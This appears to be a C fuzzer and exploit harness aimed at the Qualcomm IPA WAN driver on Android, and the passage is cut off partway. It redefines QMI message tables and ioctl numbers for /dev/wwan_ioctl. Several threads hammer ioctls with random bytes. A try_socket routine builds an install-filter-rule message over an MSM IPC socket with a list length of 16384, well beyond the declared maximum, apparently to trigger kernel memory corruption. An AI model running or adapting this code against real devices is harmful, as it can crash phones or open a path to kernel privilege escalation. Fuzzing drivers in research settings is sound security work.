		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_range_eq_16_type_v01,
			offset),
	},
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_range_eq_16_type_v01,
			range_low),
	},
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_ipfltr_range_eq_16_type_v01,
			range_high),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};


static struct elem_info ipa_filter_rule_type_data_v01_ei[] = {
	{
		.data_type	= QMI_UNSIGNED_2_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint16_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_rule_type_v01,
			rule_eq_bitmap),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_rule_type_v01,
			tos_eq_present),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					tos_eq),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					protocol_eq_present),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					protocol_eq),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					num_ihl_offset_range_16),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_IPFLTR_NUM_IHL_RANGE_16_EQNS_V01,
		.elem_size	= sizeof(
			struct ipa_ipfltr_range_eq_16_type_v01),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_range_16),
		.ei_array	= ipa_ipfltr_range_eq_16_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					num_offset_meq_32),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_IPFLTR_NUM_MEQ_32_EQNS_V01,
		.elem_size	= sizeof(struct ipa_ipfltr_mask_eq_32_type_v01),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					offset_meq_32),
		.ei_array	= ipa_ipfltr_mask_eq_32_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					tc_eq_present),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					tc_eq),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					flow_eq_present),
	},
	{
		.data_type	= QMI_UNSIGNED_4_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint32_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					flow_eq),
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_eq_16_present),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_ipfltr_eq_16_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_eq_16),
		.ei_array	= ipa_ipfltr_eq_16_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_eq_32_present),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_ipfltr_eq_32_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_eq_32),
		.ei_array	= ipa_ipfltr_eq_32_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					num_ihl_offset_meq_32),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= QMI_IPA_IPFLTR_NUM_IHL_MEQ_32_EQNS_V01,
		.elem_size	= sizeof(struct ipa_ipfltr_mask_eq_32_type_v01),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ihl_offset_meq_32),
		.ei_array	= ipa_ipfltr_mask_eq_32_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					num_offset_meq_128),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	=
			QMI_IPA_IPFLTR_NUM_MEQ_128_EQNS_V01,
		.elem_size	= sizeof(
			struct ipa_ipfltr_mask_eq_128_type_v01),
		.is_array	= STATIC_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(
			struct ipa_filter_rule_type_v01,
			offset_meq_128),
		.ei_array	= ipa_ipfltr_mask_eq_128_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					metadata_meq32_present),
	},
	{
		.data_type	= QMI_STRUCT,
		.elem_len	= 1,
		.elem_size	= sizeof(struct ipa_ipfltr_mask_eq_32_type_v01),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					metadata_meq32),
		.ei_array	= ipa_ipfltr_mask_eq_32_type_data_v01_ei,
	},
	{
		.data_type	= QMI_UNSIGNED_1_BYTE,
		.elem_len	= 1,
		.elem_size	= sizeof(uint8_t),
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
		.offset		= offsetof(struct ipa_filter_rule_type_v01,
					ipv4_frag_eq_present),
	},
	{
		.data_type	= QMI_EOTI,
		.is_array	= NO_ARRAY,
		.tlv_type	= QMI_COMMON_TLV_TYPE,
	},
};

static struct elem_info ipa_filter_spec_type_data_v01_ei[] = {
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct ipa_filter_spec_type_v01,
					   filter_spec_identifier),
	},
	{
		.data_type      = QMI_SIGNED_4_BYTE_ENUM,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct ipa_filter_spec_type_v01,
					   ip_type),
	},
	{
		.data_type      = QMI_STRUCT,
		.elem_len       = 1,
		.elem_size      = sizeof(struct ipa_filter_rule_type_v01),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct ipa_filter_spec_type_v01,
					   filter_rule),
		.ei_array       = ipa_filter_rule_type_data_v01_ei,
	},
	{
		.data_type      = QMI_SIGNED_4_BYTE_ENUM,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct ipa_filter_spec_type_v01,
					   filter_action),
	},
	{
		.data_type      = QMI_UNSIGNED_1_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct ipa_filter_spec_type_v01,
					   is_routing_table_index_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct ipa_filter_spec_type_v01,
					   route_table_index),
	},
	{
		.data_type      = QMI_UNSIGNED_1_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct ipa_filter_spec_type_v01,
					   is_mux_id_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct ipa_filter_spec_type_v01,
					   mux_id),
	},
	{
		.data_type      = QMI_EOTI,
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
	},
};

struct elem_info ipa_install_fltr_rule_req_msg_data_v01_ei[] = {
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   filter_spec_list_valid),
	},
	{
		.data_type      = QMI_DATA_LEN,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   filter_spec_list_len),
	},
	{
		.data_type      = QMI_STRUCT,
		.elem_len       = QMI_IPA_MAX_FILTERS_V01,
		.elem_size      = sizeof(struct ipa_filter_spec_type_v01),
		.is_array       = VAR_LEN_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   filter_spec_list),
		.ei_array       = ipa_filter_spec_type_data_v01_ei,
	},
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x11,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   source_pipe_index_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x11,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   source_pipe_index),
	},
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x12,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   num_ipv4_filters_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x12,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   num_ipv4_filters),
	},
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x13,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   num_ipv6_filters_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x13,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   num_ipv6_filters),
	},
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x14,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   xlat_filter_indices_list_valid),
	},
	{
		.data_type      = QMI_DATA_LEN,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x14,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   xlat_filter_indices_list_len),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = QMI_IPA_MAX_FILTERS_V01,
		.elem_size      = sizeof(uint32_t),
		.is_array       = VAR_LEN_ARRAY,
		.tlv_type       = 0x14,
		.offset         = offsetof(
					   struct ipa_install_fltr_rule_req_msg_v01,
					   xlat_filter_indices_list),
	},
	{
		.data_type      = QMI_EOTI,
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
	},
};


/*Service Message Definition*/
#define QMI_IPA_INDICATION_REGISTER_REQ_V01 0x0020
#define QMI_IPA_INDICATION_REGISTER_RESP_V01 0x0020
#define QMI_IPA_INIT_MODEM_DRIVER_REQ_V01 0x0021
#define QMI_IPA_INIT_MODEM_DRIVER_RESP_V01 0x0021
#define QMI_IPA_MASTER_DRIVER_INIT_COMPLETE_IND_V01 0x0022
#define QMI_IPA_INSTALL_FILTER_RULE_REQ_V01 0x0023
#define QMI_IPA_INSTALL_FILTER_RULE_RESP_V01 0x0023
#define QMI_IPA_FILTER_INSTALLED_NOTIF_REQ_V01 0x0024
#define QMI_IPA_FILTER_INSTALLED_NOTIF_RESP_V01 0x0024
#define QMI_IPA_ENABLE_FORCE_CLEAR_DATAPATH_REQ_V01 0x0025
#define QMI_IPA_ENABLE_FORCE_CLEAR_DATAPATH_RESP_V01 0x0025
#define QMI_IPA_DISABLE_FORCE_CLEAR_DATAPATH_REQ_V01 0x0026
#define QMI_IPA_DISABLE_FORCE_CLEAR_DATAPATH_RESP_V01 0x0026
#define QMI_IPA_CONFIG_REQ_V01 0x0027
#define QMI_IPA_CONFIG_RESP_V01 0x0027
#define QMI_IPA_DISABLE_LINK_LOW_PWR_STATE_REQ_V01 0x0028
#define QMI_IPA_DISABLE_LINK_LOW_PWR_STATE_RESP_V01 0x0028
#define QMI_IPA_ENABLE_LINK_LOW_PWR_STATE_REQ_V01 0x0029
#define QMI_IPA_ENABLE_LINK_LOW_PWR_STATE_RESP_V01 0x0029
#define QMI_IPA_GET_DATA_STATS_REQ_V01 0x0030
#define QMI_IPA_GET_DATA_STATS_RESP_V01 0x0030
#define QMI_IPA_GET_APN_DATA_STATS_REQ_V01 0x0031
#define QMI_IPA_GET_APN_DATA_STATS_RESP_V01 0x0031
#define QMI_IPA_SET_DATA_USAGE_QUOTA_REQ_V01 0x0032
#define QMI_IPA_SET_DATA_USAGE_QUOTA_RESP_V01 0x0032
#define QMI_IPA_DATA_USAGE_QUOTA_REACHED_IND_V01 0x0033
#define QMI_IPA_STOP_DATA_USAGE_QUOTA_REQ_V01 0x0034
#define QMI_IPA_STOP_DATA_USAGE_QUOTA_RESP_V01 0x0034
#define QMI_IPA_INIT_MODEM_DRIVER_CMPLT_REQ_V01 0x0035
#define QMI_IPA_INIT_MODEM_DRIVER_CMPLT_RESP_V01 0x0035

/* add for max length*/
#define QMI_IPA_INIT_MODEM_DRIVER_REQ_MAX_MSG_LEN_V01 134
#define QMI_IPA_INIT_MODEM_DRIVER_RESP_MAX_MSG_LEN_V01 25
#define QMI_IPA_INDICATION_REGISTER_REQ_MAX_MSG_LEN_V01 8
#define QMI_IPA_INDICATION_REGISTER_RESP_MAX_MSG_LEN_V01 7
#define QMI_IPA_INSTALL_FILTER_RULE_REQ_MAX_MSG_LEN_V01 22369
#define QMI_IPA_INSTALL_FILTER_RULE_RESP_MAX_MSG_LEN_V01 783
#define QMI_IPA_FILTER_INSTALLED_NOTIF_REQ_MAX_MSG_LEN_V01 834
#define QMI_IPA_FILTER_INSTALLED_NOTIF_RESP_MAX_MSG_LEN_V01 7
#define QMI_IPA_MASTER_DRIVER_INIT_COMPLETE_IND_MAX_MSG_LEN_V01 7
#define QMI_IPA_DATA_USAGE_QUOTA_REACHED_IND_MAX_MSG_LEN_V01 15


#define QMI_IPA_ENABLE_FORCE_CLEAR_DATAPATH_REQ_MAX_MSG_LEN_V01 18
#define QMI_IPA_DISABLE_FORCE_CLEAR_DATAPATH_REQ_MAX_MSG_LEN_V01 7
#define QMI_IPA_ENABLE_FORCE_CLEAR_DATAPATH_RESP_MAX_MSG_LEN_V01 7
#define QMI_IPA_DISABLE_FORCE_CLEAR_DATAPATH_RESP_MAX_MSG_LEN_V01 7


#define QMI_IPA_CONFIG_REQ_MAX_MSG_LEN_V01 102
#define QMI_IPA_CONFIG_RESP_MAX_MSG_LEN_V01 7
#define QMI_IPA_DISABLE_LINK_LOW_PWR_STATE_REQ_MAX_MSG_LEN_V01 18
#define QMI_IPA_DISABLE_LINK_LOW_PWR_STATE_RESP_MAX_MSG_LEN_V01 7
#define QMI_IPA_ENABLE_LINK_LOW_PWR_STATE_REQ_MAX_MSG_LEN_V01 7
#define QMI_IPA_ENABLE_LINK_LOW_PWR_STATE_RESP_MAX_MSG_LEN_V01 7
#define QMI_IPA_GET_DATA_STATS_REQ_MAX_MSG_LEN_V01 11
#define QMI_IPA_GET_DATA_STATS_RESP_MAX_MSG_LEN_V01 2234
#define QMI_IPA_GET_APN_DATA_STATS_REQ_MAX_MSG_LEN_V01 36
#define QMI_IPA_GET_APN_DATA_STATS_RESP_MAX_MSG_LEN_V01 299
#define QMI_IPA_SET_DATA_USAGE_QUOTA_REQ_MAX_MSG_LEN_V01 100
#define QMI_IPA_SET_DATA_USAGE_QUOTA_RESP_MAX_MSG_LEN_V01 7
#define QMI_IPA_STOP_DATA_USAGE_QUOTA_REQ_MAX_MSG_LEN_V01 0
#define QMI_IPA_STOP_DATA_USAGE_QUOTA_RESP_MAX_MSG_LEN_V01 7

#define QMI_IPA_INIT_MODEM_DRIVER_CMPLT_REQ_MAX_MSG_LEN_V01 4
#define QMI_IPA_INIT_MODEM_DRIVER_CMPLT_RESP_MAX_MSG_LEN_V01 7

/* Service Object Accessor */

#endif/* IPA_QMI_SERVICE_V01_H */


struct msm_ipc_port_addr {
	uint32_t node_id;
	uint32_t port_id;
};

struct msm_ipc_port_name {
	uint32_t service;
	uint32_t instance;
};

struct msm_ipc_addr {
	unsigned char  addrtype;
	union {
		struct msm_ipc_port_addr port_addr;
		struct msm_ipc_port_name port_name;
	} addr;
};

struct sockaddr_msm_ipc {
	unsigned short family;
	struct msm_ipc_addr address;
	unsigned char reserved;
};

#define MSM_IPC_ADDR_NAME 1
#define MSM_IPC_ADDR_ID 2

enum ipacm_client_enum {
	IPACM_CLIENT_USB = 1,
	IPACM_CLIENT_WLAN,
	        IPACM_CLIENT_MAX
};

struct wan_ioctl_set_tether_client_pipe {
	/* enum of tether interface */
	enum ipacm_client_enum ipa_client;
	uint8_t reset_client;
	uint32_t ul_src_pipe_len;
	uint32_t ul_src_pipe_list[QMI_IPA_MAX_PIPES_V01];
	uint32_t dl_dst_pipe_len;
	uint32_t dl_dst_pipe_list[QMI_IPA_MAX_PIPES_V01];
};

#define IFNAMSIZ 16

struct wan_ioctl_query_tether_stats {
	/* Name of the upstream interface */
	char upstreamIface[IFNAMSIZ];
	/* Name of the tethered interface */
	char tetherIface[IFNAMSIZ];
	/* enum of tether interface */
	enum ipacm_client_enum ipa_client;
	uint64_t ipv4_tx_packets;
	uint64_t ipv4_tx_bytes;
	uint64_t ipv4_rx_packets;
	uint64_t ipv4_rx_bytes;
	uint64_t ipv6_tx_packets;
	uint64_t ipv6_tx_bytes;
	uint64_t ipv6_rx_packets;
	uint64_t ipv6_rx_bytes;
};


#define QMI_REQUEST_CONTROL_FLAG 0x00
#define BUILD_INSTANCE_ID(vers, ins) (((vers) & 0xFF) | (((ins) & 0xFF) << 8))

#define WAN_IOC_MAGIC 0x69

#define WAN_IOCTL_ADD_FLT_RULE          0
#define WAN_IOCTL_ADD_FLT_INDEX         1
#define WAN_IOCTL_VOTE_FOR_BW_MBPS      2
#define WAN_IOCTL_POLL_TETHERING_STATS  3
#define WAN_IOCTL_SET_DATA_QUOTA        4
#define WAN_IOCTL_SET_TETHER_CLIENT_PIPE 5
#define WAN_IOCTL_QUERY_TETHER_STATS     6
#define WAN_IOCTL_RESET_TETHER_STATS     7
#define WAN_IOCTL_QUERY_DL_FILTER_STATS  8

#define WAN_IOC_ADD_FLT_RULE _IOWR(WAN_IOC_MAGIC, \
				   WAN_IOCTL_ADD_FLT_RULE, \
				   struct ipa_install_fltr_rule_req_msg_v01 *)

#define WAN_IOC_QUERY_TETHER_STATS _IOWR(WAN_IOC_MAGIC, \
					 WAN_IOCTL_QUERY_TETHER_STATS, \
					 struct wan_ioctl_query_tether_stats *)

#define WAN_IOC_SET_TETHER_CLIENT_PIPE _IOWR(WAN_IOC_MAGIC, \
					     WAN_IOCTL_SET_TETHER_CLIENT_PIPE, \
					     struct wan_ioctl_set_tether_client_pipe *)


#define WAN_IOC_ADD_FLT_RULE_INDEX _IOWR(WAN_IOC_MAGIC, \
					 WAN_IOCTL_ADD_FLT_INDEX, \
					 struct ipa_fltr_installed_notif_req_msg_v01 *)


#define WAN_IOC_RESET_TETHER_STATS _IOWR(WAN_IOC_MAGIC, \
					 WAN_IOCTL_RESET_TETHER_STATS, \
					 struct wan_ioctl_reset_tether_stats *)



static const char* dev = "/dev/wwan_ioctl";


static void fuzz(char *msg, size_t len) {
	while (len--)
		*msg++ = rand() % 255;
}



struct rmnet_ioctl_extended_s {
	uint32_t   extended_ioctl;
	union {
		uint32_t data; /* Generic data field for most extended IOCTLs */
		int8_t if_name[IFNAMSIZ];

		/* Input values for the RMNET_IOCTL_ADD_MUX_CHANNEL IOCTL */
		struct {
			uint32_t  mux_id;
			int8_t    vchannel_name[IFNAMSIZ];
		} rmnet_mux_val;

		/* Input values for the RMNET_IOCTL_FLOW_CONTROL IOCTL */
		struct {
			uint8_t   flow_mode;
			uint8_t   mux_id;
		} flow_control_prop;

		/* Return values for RMNET_IOCTL_GET_EP_PAIR */
		struct {
			uint32_t   consumer_pipe_num;
			uint32_t   producer_pipe_num;
		} ipa_ep_pair;

		struct {
			uint32_t __data; /* Placeholder for legacy data*/
			uint32_t agg_size;
			uint32_t agg_count;
		} ingress_format;
	} u;
};


#define RMNET_IOCTL_SET_EGRESS_DATA_FORMAT 0x0006
#define RMNET_IOCTL_EXTENDED  0x000089FD
void *flt_rule(void *_fd)
{
	int fd = *(int *)_fd;
	struct ipa_install_fltr_rule_req_msg_v01 msg = { 0x00 };
	struct ifreq freak = { 0 };
	struct rmnet_ioctl_extended_s extended = { 0 };
	memcpy(freak.ifr_name, "rmnet_ipa0", strlen("rmnet_ipa0"));
	//int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
	freak.ifr_data = (void*)&extended;
	extended.extended_ioctl = RMNET_IOCTL_SET_EGRESS_DATA_FORMAT;

	while(true) {
		fuzz((void*)&msg, sizeof(msg));
		ioctl(fd, WAN_IOC_ADD_FLT_RULE, &msg);
		//ioctl(socket_fd, RMNET_IOCTL_EXTENDED, &freak);
		printf("Done with %s\n", strerror(errno));
		sleep(1);
	}
}

void *flt_rule_index(void *_fd)
{
	int fd = *(int *)_fd;
	struct ipa_fltr_installed_notif_req_msg_v01 msg;
	enum ipa_qmi_result_type_v01 types[] = { IPA_QMI_RESULT_TYPE_MIN_ENUM_VAL_V01,
					   IPA_QMI_RESULT_SUCCESS_V01,
					   IPA_QMI_RESULT_FAILURE_V01,
					   IPA_QMI_RESULT_TYPE_MAX_ENUM_VAL_V01};
	while(true) {
		fuzz((void*)&msg, sizeof(msg));
		msg.filter_index_list_len = QMI_IPA_MAX_FILTERS_V01;
		msg.install_status = types[rand() % 4];
		ioctl(fd, WAN_IOC_ADD_FLT_RULE_INDEX, &msg);
		sleep(1);
	}
}

void *tether_stats(void *_fd)
{
	int fd = *(int *)_fd;
	struct wan_ioctl_query_tether_stats msg;
	while(true) {
		fuzz((void*)&msg, sizeof(msg));
		ioctl(fd, WAN_IOC_QUERY_TETHER_STATS, &msg);
		usleep(500000);
	}
}

void *client_pipe(void *_fd)
{
	int fd = *(int *)_fd;
	struct wan_ioctl_set_tether_client_pipe msg;
	while(true) {
		fuzz((void*)&msg, sizeof(msg));
		msg.ipa_client = (rand() % 2) + 1;
		ioctl(fd, WAN_IOC_SET_TETHER_CLIENT_PIPE, &msg);
		usleep(50000);
	}
}

void *try_socket(void *ignore)
{
	int fd;
	struct ipa_install_fltr_rule_req_msg_v01  _req_msg;
	struct ipa_install_fltr_rule_req_msg_v01  *req_msg = &_req_msg;
	struct sockaddr_msm_ipc addr = { 0 };
	struct msghdr msg = { 0 };
	struct iovec io = { 0 };
	struct qmi_header *hdr;
	struct msg_desc resp_desc;
	int i;

	addr.family = AF_MSM_IPC;
	addr.address.addrtype = MSM_IPC_ADDR_NAME;
	addr.address.addr.port_name.service = IPA_A5_SERVICE_SVC_ID;
	addr.address.addr.port_name.instance =
		BUILD_INSTANCE_ID(IPA_A5_SVC_VERS, IPA_A5_SERVICE_INS_ID);

	memset(req_msg, 0x01, sizeof(*req_msg));

	io.iov_base = malloc(QMI_IPA_INSTALL_FILTER_RULE_REQ_MAX_MSG_LEN_V01 + 4096);
	io.iov_len = QMI_IPA_INSTALL_FILTER_RULE_REQ_MAX_MSG_LEN_V01 + sizeof(msg);
	memset(io.iov_base, 0, io.iov_len);

	msg.msg_iovlen = 1;
	msg.msg_iov = &io;
	msg.msg_name = &addr;
	msg.msg_namelen = sizeof(addr);

	hdr = io.iov_base;
	hdr->msg_id = QMI_IPA_INSTALL_FILTER_RULE_REQ_V01;
	hdr->cntl_flag = QMI_REQUEST_CONTROL_FLAG;
	hdr->txn_id = 0;
	hdr->msg_len = QMI_IPA_INSTALL_FILTER_RULE_REQ_MAX_MSG_LEN_V01;
	//req_msg = io.iov_base + sizeof(*hdr);
	req_msg->filter_spec_list_valid = 1;
	req_msg->filter_spec_list_len = 16384;
	for (i = 0; i < QMI_IPA_MAX_FILTERS_V01; i++) {
		req_msg->filter_spec_list[i].ip_type = QMI_IPA_IP_TYPE_V4_V01;
		req_msg->filter_spec_list[i].filter_rule.num_ihl_offset_range_16 = 0;
		req_msg->filter_spec_list[i].filter_rule.rule_eq_bitmap = 0xFFFF;
		req_msg->filter_spec_list[i].filter_rule.tos_eq_present = 1;
		req_msg->filter_spec_list[i].filter_rule.tos_eq = 1;
		req_msg->filter_spec_list[i].filter_rule.protocol_eq_present = 1;
		req_msg->filter_spec_list[i].filter_rule.protocol_eq = 1;
		req_msg->filter_spec_list[i].filter_rule.num_ihl_offset_range_16 = 1;
